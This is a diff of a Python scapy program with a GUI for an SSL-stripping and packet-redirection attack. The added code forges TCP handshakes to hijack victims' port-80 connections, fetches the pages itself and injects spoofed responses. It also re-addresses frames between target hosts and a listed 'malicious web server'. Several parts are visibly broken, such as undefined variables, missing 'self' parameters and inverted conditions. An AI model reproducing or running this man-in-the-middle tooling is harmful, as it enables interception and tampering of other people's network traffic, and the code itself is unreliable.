@@ -7,6 +7,7 @@ import os
 from scapy.all import *
 from scapy.layers.inet import IP
 from scapy.layers.inet import TCP
+#from scapy.layers.http import *
 import threading
 import time
 import requests
@@ -106,12 +107,12 @@ class sslStrip():
         Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
 
         self.initThread()
-        sll_thread = threading.Thread(target=self.sslstrip)
-        sll_thread.setDaemon(True)
-        sll_thread.start()
+        while True:
+            sniff(store=0, prn=lambda packet: self.packetForwarding(packet), iface=self.interface)
+
 
     def ssl_filter(self, pkt):
-        return pkt.haslayer(TCP) and pkt[TCP].dport == 80 and pkt[TCP].flags == 'S' and (pkt[IP].src in [victim["IP"] for victim in self.target])
+        return TCP in pkt and pkt[TCP].dport == 80 and pkt[TCP].flags == 'S' and (pkt[IP].src in [victim["IP"] for victim in self.sslVictims])
 
     def initShow(self):
         scroll = Scrollbar(self.root)
@@ -128,56 +129,72 @@ class sslStrip():
         proc_thread.daemon = True
         proc_thread.start()
 
-    def sslstrip(self):
-        self.show.insert(END, "5 Redirect from ")
+		
+    def sslStrip(packet):
+        syn_ack = IP(dst=packet[IP].src,  src = packet[IP].dst) / TCP(sport=packet[TCP].dport, dport = packet[TCP].sport,flags='SA', seq = 0, ack = packet[TCP].seq + 1)
+        ack = sr1(syn_ack)
+        packetHttp = sniff(filter = "port 80", count = 1)[0]
+        ack = IP(dst=packet[IP].src, src =packet[IP].dst ) / TCP(dport=packetHttp.sport, sport=packetHttp[TCP].dport,seq=1, ack= packetHttp[TCP].seq + len(packetHttp[TCP].payload),flags='A')
+        send(ack)
+        if(HTTP in packetHttp):
+            resp = sendRequest(packetHttp)
+            load = resp.text
+            response = IP(dst=packet[IP].src, src =packet[IP].dst ) / TCP(dport=packetHttp[TCP].sport, sport=packetHttp[TCP].dport,seq=ack[TCP].seq, ack= ack[TCP].ack, flags='A') /HTTP()/HTTPResponse(Content_Type = resp.headers['Content-Type'] if 'Content-Type' in resp.headers else None,Date = resp.headers['Date'] if 'Date' in resp.headers else None,Connection = 'keep-alive')/load
+            response_payload = response[TCP].payload.do_build()
+            base_seq = response[TCP].seq
+            offset = 0
+            for i in range(0, len(response_payload), 1500):
+                respons = IP(dst=packet[IP].src, src =packet[IP].dst ) / TCP(dport=packetHttp[TCP].sport, sport=packetHttp[TCP].dport, seq=base_seq + offset, ack= ack[TCP].ack, flags='PA') / response_payload[i:i+1500]
+                offset += len(response_payload[i:i+1500])
+                send(respons, iface=self.interface)
+
+    def sendRequest(pkt):
+        if(HTTP in pkt and HTTPRequest in pkt[HTTP]):
+            if(pkt[HTTP][HTTPRequest].Method == b"GET"):
+                resp = requests.get("http://" + str(pkt[HTTP][HTTPRequest].Host.decode()) + str(pkt[HTTP][HTTPRequest].Path.decode()))
+                return resp
+		
+    def packetForwarding(self, packet):
+        
+        if not TCP in pkt and pkt[TCP].dport == 80 and pkt[TCP].flags == 'S' and (pkt[IP].src in [victim["IP"] for victim in self.target]):
+            sender= None
+            senderfound = False
+            receiver = None
+            receiverfound = False
+            for vict in self.target:
+                if (vict["mac"] == packet[Ether].src):
+                    sender, senderfound = self.SndFound(vict)
+                    if (self.maliciousWebServer[0]["ip"] == packet[IP].dst):
+                        receiver, receiverfound = self.rcvFound(self.maliciousWebServer[0])
+            if ((not senderfound) or (not receiverfound)):
+                if (self.maliciousWebServer[0]["mac"] == packet[Ether].src):
+                    sender, senderfound = self.SndFound(self.maliciousWebServer[0])
+                    for vict in self.target:
+                        if (vict["ip"] == packet[IP].dst):
+                            receiver, receiverfound = self.rcvFound(vict)
+            if (senderfound and receiverfound):
+                self.modifyAndSend(packet, sender, receiver)
+        else: sslStrip(packet)
+
+    def rcvFound(self, subj):
+        receiver = subj
+        receiverfound = True
+        return receiver,receiverfound
+
+    def SndFound(self, subj):
+        sender = subj
+        senderfound = True
+        return sender,senderfound
+
+    def modifyAndSend(self, packet, sender, receiver):
+        packet[Ether].src = self.myMAC
+        packet[Ether].dst = receiver["mac"]
+        sendp(packet, iface=self.interface, verbose=False)
+        self.show.insert(END, "Redirect from ip: {}, mac: {}".format(sender["ip"], sender["mac"]) + '\n')
+        self.show.insert(END, "to ip: {}, mac: {}".format(receiver["ip"], receiver["mac"]) + '\n')                                                                    
         self.show.insert(END,'\n')                                                                    
         self.show.see(END)
         self.show.update_idletasks()
-        def sendRequest(pkt):
-            if(HTTP in pkt and HTTPRequest in pkt[HTTP]):
-                if(pkt[HTTP][HTTPRequest].Method == b"GET"):
-                    resp = requests.get("http://" + str(pkt[HTTP][HTTPRequest].Host.decode()) + str(pkt[HTTP][HTTPRequest].Path.decode()))
-                    return resp
-		
-        def sslStrip(packet):
-            victIp = packet[IP].src
-            siteIp = packet[IP].dst
-            syn_ack = IP(dst=victIp,  src = siteIp) / TCP(sport=packet[TCP].dport, dport = packet[TCP].sport,flags='SA', seq = 0, ack = packet[TCP].seq + 1)
-            ack = sr1(syn_ack)
-
-            http_pkt = sniff(filter = "port 80", count = 1)[0]
-			
-            ack = IP(dst=victIp, src =siteIp ) / TCP(dport=http_pkt.sport, sport=http_pkt[TCP].dport,
-														 seq=1, ack= http_pkt[TCP].seq + len(http_pkt[TCP].payload),
-														 flags='A')
-            send(ack)
-            if(HTTP in http_pkt):
-                resp = sendRequest(http_pkt)
-                load = resp.text
-				
-                response = IP(dst=victIp, src =siteIp ) / TCP(dport=http_pkt[TCP].sport, sport=http_pkt[TCP].dport,
-														 seq=ack[TCP].seq, ack= ack[TCP].ack,
-														 flags='A') /HTTP()/HTTPResponse(
-															Content_Type = resp.headers['Content-Type'] if 'Content-Type' in resp.headers else None,
-															Date = resp.headers['Date'] if 'Date' in resp.headers else None,
-															Connection = 'keep-alive'
-														)/load
-                response_payload = response[TCP].payload.do_build()
-
-                base_seq = response[TCP].seq
-                offset = 0
-                for i in range(0, len(response_payload), 1500):
-                    re = IP(dst=victIp, src =siteIp ) / TCP(dport=http_pkt[TCP].sport, sport=http_pkt[TCP].dport,
-														 seq=base_seq + offset, ack= ack[TCP].ack, flags='PA') / response_payload[i:i+1500]
-					
-                    offset += len(response_payload[i:i+1500])
-					
-                    send(re, iface=self.NETWORK_INTERFACE)
-
-		
-        sniff(lfilter=self.ssl_filter, prn=sslStrip, iface=self.interface)
-
-
 
     def setInput(self, rangeIPs, usedIPs, target, maliciousWebServer, myMAC):
         self.rangeIPs = rangeIPs
